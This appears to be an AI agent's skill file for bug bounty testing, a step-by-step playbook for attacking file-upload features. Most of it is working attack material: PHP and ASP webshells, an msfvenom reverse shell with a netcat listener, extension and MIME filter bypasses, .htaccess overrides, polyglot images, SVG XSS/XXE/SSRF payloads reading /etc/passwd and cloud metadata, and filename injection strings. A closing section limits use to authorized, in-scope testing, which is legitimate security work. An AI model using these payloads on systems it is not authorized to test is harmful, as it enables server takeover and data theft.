---
name: file-upload
description: File Upload Attacks — arbitrary webshell upload, filter bypasses (client-side, blacklist, whitelist, MIME/content-type, magic bytes), limited-upload secondary attacks (SVG XSS, XXE, SSRF), .htaccess upload, polyglots, second-order execution, filename injection. Use when HauntMode flags file upload functionality, or when the user explicitly says they are testing file upload.
---

# File Upload Attacks (CBBH #08)

Read top-to-bottom on first invocation. Later runs can jump directly to the relevant decision branch.

---

## 1. Triggers — when this skill applies

- Any form or API endpoint that accepts file data (multipart/form-data uploads)
- Profile photo / avatar upload
- Document, invoice, or report upload
- Image gallery / media library upload
- Feedback / contact form attachments
- Import / export settings that accept files
- API endpoints with `POST /api/upload` or similar routes
- Any response that returns a URL pointing to an uploaded file

---

---

## 3. 30-second triage

Answer these before doing anything else:

1. What is the back-end language? (Check `index.php`, Wappalyzer, response headers, error messages)
2. Where are uploaded files served from? (Check the response after upload — `src=` attribute, `Location` header, or API response body)
3. Is the upload directory under a web-accessible path? (e.g. `/uploads/`, `/profile_images/`) — if not, webshell is useless even if uploaded
4. Does any validation exist? (Does selecting a `.php` file fail client-side only, or does the POST itself fail too?)

**Skip deep file-upload testing if:** The upload directory is not web-accessible AND there is no XML/SVG processing path. Note the endpoint and move on — limited attacks (SVG XSS, XXE) may still apply.

---

## 4. Decision tree — what to test first

```
Upload functionality found
│
├─► No validation at all?
│      → Upload direct webshell (§5.1)
│
├─► Client-side validation only?
│      → Bypass via Burp tamper or DOM edit (§5.2)
│
├─► Back-end blacklist filter?
│      → Try alternative extensions from bypass list (§6.1)
│      → Case manipulation on Windows (pHp, PHP, Php)
│      → Fuzz with Burp Intruder using PHP extensions wordlist
│
├─► Back-end whitelist filter (only jpg/png/gif allowed)?
│      → Double extension: shell.jpg.php (§6.2)
│      → Reverse double extension: shell.php.jpg (§6.2)
│      → Character injection: shell.php%00.jpg, shell.php%0a.jpg (§6.2)
│      → .htaccess upload attack (§6.3)
│
├─► Content-Type filter (checks header)?
│      → Swap Content-Type to image/jpeg in Burp (§6.4)
│
├─► MIME/magic bytes filter (checks file content)?
│      → Inject GIF8 magic bytes before PHP code (§6.5)
│      → Polyglot file: real image + embedded PHP (§6.6)
│
└─► Can only upload images/SVG/XML/PDF?
       → Limited upload attacks (§7)
```

---

## 5. Direct exploitation — no or client-side validation

### 5.1 No validation — direct webshell upload

Identify web language first:
```bash
# Try visiting index.php, index.asp, index.aspx
curl -s http://target/index.php | head -5
# Or use Wappalyzer, check Server/X-Powered-By headers
```

PHP webshell (minimal):
```php
<?php system($_REQUEST['cmd']); ?>
```

Save as `shell.php`, upload, then execute:
```
http://target/uploads/shell.php?cmd=id
```

.NET (ASP) webshell:
```
<% eval request('cmd') %>
```

For interactive use, phpbash or pentestmonkey reverse shell from SecLists:
```bash
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
nc -lvnp OUR_PORT
```

### 5.2 Client-side validation bypass

**Method 1 — Burp tamper (preferred):**
1. Upload a legitimate image normally — capture in Burp
2. In Repeater: change `filename="image.jpg"` to `filename="shell.php"`
3. Change the file body to the PHP webshell
4. Forward — the back-end never sees the JS validation

**Method 2 — DOM edit:**
1. Open DevTools (F12) → Inspector → click the file input element
2. Find `onchange="checkFile(this)"` — delete the function name
3. Find `accept=".jpg,.jpeg,.png"` — delete or change to `*`
4. Upload the PHP file normally through the modified form

---

## 6. Filter bypasses

### 6.1 Extension blacklist bypass — alternative PHP extensions

Try each of these. Not all work on every server config — fuzz with Burp Intruder:

```
.php3
.php4
.php5
.php7
.php8
.pht
.phar
.phpt
.pgif
.phtml
.phtm
.shtml (if SSI enabled)
```

For case-insensitive Windows servers:
```
.PHP
.pHp
.Php
.PhP
```

Resources for fuzzing:
- PHP: `https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst`
- ASP: `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP`
- General: `SecLists/Discovery/Web-Content/web-extensions.txt`

[RUN THIS] to fuzz extensions via Burp Intruder — load the PHP extensions list as payload, set position on the extension in the filename parameter.

### 6.2 Extension whitelist bypass

**Double extension** (when whitelist checks `contains` not `ends with`):
```
shell.jpg.php
shell.png.php
```

**Reverse double extension** (when Apache/Nginx is misconfigured to execute `.php` anywhere in filename):
```
shell.php.jpg
shell.php.png
```
Apache config that enables this: `<FilesMatch ".+\.ph(ar|p|tml)">` (missing `$` at end of regex)

**Character injection** (before/after the allowed extension):
```
shell.php%00.jpg        # null byte — PHP < 5.5 truncates at %00
shell.php%0a.jpg        # newline
shell.php%20.jpg        # space
shell.php%0d0a.jpg      # CRLF
shell.php/.jpg          # path traversal bypass
shell.php....jpg        # dots
shell.php::$DATA.jpg    # Windows ADS (NTFS alternate data stream)
```

Generate a comprehensive wordlist:
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '...' ':'; do
    for ext in '.php' '.phtml' '.phar' '.php5' '.php7'; do
        echo "shell${char}${ext}.jpg" >> upload_wordlist.txt
        echo "shell${ext}${char}.jpg" >> upload_wordlist.txt
        echo "shell.jpg${char}${ext}" >> upload_wordlist.txt
        echo "shell.jpg${ext}${char}" >> upload_wordlist.txt
    done
done
```

### 6.3 .htaccess upload attack

If the server runs Apache and allows uploading `.htaccess` files:

1. Upload a file named `.htaccess` with this content:
```
AddType application/x-httpd-php .jpg
```
2. Now upload `shell.jpg` containing `<?php system($_REQUEST['cmd']); ?>`
3. The server will execute `.jpg` files as PHP in that directory

Alternative — force-execute a specific file:
```
<Files "shell.jpg">
SetHandler application/x-httpd-php
</Files>
```

### 6.4 Content-Type header bypass

When the server checks `$_FILES['uploadFile']['type']` (the HTTP `Content-Type` header):

In the multipart upload request, change:
```
Content-Type: application/x-php
```
to:
```
Content-Type: image/jpeg
```

Note: There are two Content-Type headers in a multipart request — the outer request header and the per-file header. Change the per-file one (the one in the part boundary, not the top of the request).

Use SecLists for fuzzing content types:
```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/web/content-type.txt
grep 'image/' content-type.txt > image-content-types.txt
# Fuzz with Burp Intruder using image-content-types.txt
```

### 6.5 MIME / magic bytes filter bypass

When the server uses `mime_content_type()` to check the actual file content:

Add magic bytes at the start of the webshell file. GIF works well:
```bash
echo 'GIF8' > shell.php
echo '<?php system($_REQUEST["cmd"]); ?>' >> shell.php
```

Or in Burp, prepend `GIF8` to the request body (before the PHP code):
```
GIF8
<?php system($_REQUEST['cmd']); ?>
```

Other magic bytes that work:
- JPEG: `\xFF\xD8\xFF` (add `ÿØÿ` at the start)
- PNG: `\x89PNG` (add `‰PNG` at the start)

### 6.6 Polyglot file

A real valid image with PHP code embedded — passes both content-type and magic-byte checks:

```bash
# Embed PHP into EXIF Comment field of a real JPEG
exiftool -Comment='<?php system($_REQUEST["cmd"]); ?>' real_image.jpg -o shell.jpg.php
```

Or append PHP after the image data:
```bash
cp real_image.jpg shell.php
echo '<?php system($_REQUEST["cmd"]); ?>' >> shell.php
```

The MIME check sees a valid JPEG; the PHP interpreter executes the PHP code it finds.

---

## 7. Limited file uploads — when you can only upload "safe" types

Even when arbitrary code execution is blocked, these attacks are still viable:

### 7.1 SVG — XSS

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
  <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
  <script type="text/javascript">alert(window.origin);</script>
</svg>
```

Fires when the SVG is rendered in-browser (not just downloaded). Stored XSS if other users view it.

Blind XSS variant (if file is viewed in admin panel):
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>var s=document.createElement('script');s.src='YOUR_EZXSS_DOMAIN/svg_upload';document.head.appendChild(s);</script>
</svg>
```

### 7.2 SVG — XXE (file read)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

Read PHP source (base64 encoded):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

Decode the result: `echo "BASE64STRING" | base64 -d`

### 7.3 SVG / XML — SSRF

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<svg>&xxe;</svg>
```

Internal service probe:
```xml
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/api/users"> ]>
```

### 7.4 XSS via image EXIF metadata

When the app displays image metadata:
```bash
exiftool -Comment='"><img src=1 onerror=alert(window.origin)>' photo.jpg
exiftool -Artist='<script>alert(window.origin)</script>' photo.jpg
```

### 7.5 Filename injection attacks

When the app uses the uploaded filename in OS commands or SQL queries:

**Command injection in filename:**
```
file$(whoami).jpg
file`whoami`.jpg
file.jpg||whoami
file;id.jpg
```

**XSS in filename** (if filename is displayed unescaped in directory listing or admin panel):
```
<script>alert(window.origin)</script>.jpg
"><img src=x onerror=alert(1)>.jpg
```

**SQLi in filename** (if filename is stored in and retrieved from a DB without sanitization):
```
file';select+sleep(5);--.jpg
```

**Path traversal in filename** (to write outside upload dir):
```
../../../var/www/html/shell.php
..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Fshell.php
```

---

## 8. Upload directory disclosure (when you don't know where files go)

If the response doesn't tell you the upload path:

1. Check page source after upload for `src=` pointing to your file
2. Look for JavaScript that redirects to the uploaded file
3. Use XXE or LFI (via SVG) to read `index.php` and find the upload directory variable
4. Force an error: upload a duplicate filename — error message may reveal the path
5. Upload an overly long filename (5000 chars) — server error may include path
6. Check `robots.txt`, common paths: `/uploads/`, `/files/`, `/media/`, `/user_uploads/`, `/profile_images/`

---

## 9. Second-order execution

Upload is processed safely at upload time, but the file is used in a dangerous context later:

- File is processed by `ffmpeg`, `ImageMagick`, `wkhtmltopdf`, `libreoffice` — may trigger RCE via known CVEs
- Filename is stored in DB and later used in an OS command (delayed CMDi)
- Uploaded SVG is later included in a PDF generator → pivot to `pdf-injection` skill
- File is included via PHP `include()` or `require()` → LFI → RCE
- `.htaccess` is uploaded but only parsed when the directory is next accessed

---

## 10. Finding the uploaded file path (locating the webshell)

After a successful upload:

1. **Check the response** — often contains the file URL in JSON (`{"url": "/uploads/abc.php"}`)
2. **View page source** — `src="/profile_images/shell.php"` attributes
3. **Read source code via XXE** — find the `$target_dir` variable in the upload handler
4. **Naming scheme** — some apps rename files: `date('ymd').'_'.basename($originalName)` → e.g. `260424_shell.php`
5. **Fuzz known paths** with the discovered extension/name pattern:

```
[RUN THIS]
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u http://target/uploads/FUZZ -mc 200,301,302
```

---

## 11. False-positive checks

- **File uploaded but 403 on the path** — the directory exists but direct access is blocked by `.htaccess` or Nginx config. File upload is present but may not be exploitable for RCE. Note and look for other execution vectors.
- **PHP displayed as source** — PHP is not being executed. The server is likely not configured to run PHP in this directory. Still useful for credential leaks if other files can be included.
- **Image rendered correctly** — the server stripped or quarantined the PHP code. Check if the response size matches what you uploaded.
- **Content-type of response is `image/jpeg`** — the server is serving with a forced content type, which may prevent PHP execution even if the file is there. Test by trying the URL directly with `curl -I`.

---

## 12. Chain candidates

| Chain | Other skill | Impact |
|---|---|---|
| Upload SVG with XXE → read `/etc/passwd` or source code | `xxe` | LFI / source disclosure |
| Upload SVG with XSS → Blind XSS in admin panel | `xss` | Stored XSS → ATO |
| Upload SVG with SSRF → internal metadata | `ssrf` | Cloud credential leak |
| Webshell uploaded → RCE → SSRF to internal services | `ssrf`, `cmdi` | Full server compromise |
| Polyglot PHAR file + `file_exists(phar://)` | `deserialization` | RCE via PHAR deserialization |
| Filename XSS → if rendered unescaped for admin | `xss` | Privilege escalation |
| Upload directory exposed → credential files readable | `idor` | Sensitive data exposure |
| PDF generator uploads → HTML injection | `pdf-injection` | SSRF / LFI via PDF |

---

## 13. Reporting template

```
POTENTIAL FINDING: File Upload — <Arbitrary Webshell | Filter Bypass | SVG XSS | XXE via Upload>
Target: <upload endpoint URL>
Parameter: <form field name, e.g. uploadFile>
Filter observed: <none | client-side JS | blacklist | whitelist | Content-Type | MIME>
Bypass used: <exact technique, e.g. "double extension shell.jpg.php" or "GIF8 magic bytes prefix">
Upload path: <URL where uploaded file is served>
Working payload: <exact filename and/or file content used>
Evidence: <webshell output showing RCE, XXE output showing /etc/passwd, XSS alert screenshot>
Impact: <RCE on web server as www-data | Stored XSS to admin session | Source code disclosure>
Chain potential: <e.g. "webshell → pivot to internal network", "SVG XXE → source code read → SQLi credential">
Next step: <escalate webshell to reverse shell, chain SVG-XXE into further LFI, submit blind XSS payload>
```

---

## 14. Recon tracker vector strings

Only log if user explicitly authorizes. Suggested tags:

- `upload:direct-rce:<extension>` — direct webshell upload succeeded
- `upload:bypass:<technique>` — filter bypassed with specific technique
- `upload:svg-xss` — SVG XSS upload confirmed
- `upload:svg-xxe` — SVG XXE confirmed, file read possible
- `upload:svg-ssrf` — SVG SSRF confirmed
- `upload:client-side-only` — confirmed only client-side validation
- `upload:path-unknown` — upload succeeds but can't locate the file
- `upload:no:<reason>` — upload tested and not exploitable

---

## 15. What NOT to do

- **Do not upload webshells to production without explicit permission.** Webshells left on servers are a critical liability. Clean up after yourself.
- **Do not upload destructive payloads.** No `rm -rf`, no ransomware scripts, no fork bombs. Stick to `id`, `whoami`, `hostname` for PoC.
- **Do not upload files to out-of-scope directories** even if path traversal seems possible. Check `scope.txt` before attempting directory traversal in filenames.
- **Do not upload decompression bombs** (`zip bomb`) or pixel flood attacks on production. These cause DoS.
- **Do not run bulk extension fuzzing** without re-reading `program-guidelines.txt` rate limits first. Upload fuzzing can be very noisy.
- **Do not auto-log to the recon tracker** without explicit user instruction (CLAUDE.md hard rule).
- **Do not assume the file is executed** just because it uploaded successfully. Always verify execution with a benign command (`?cmd=id`).
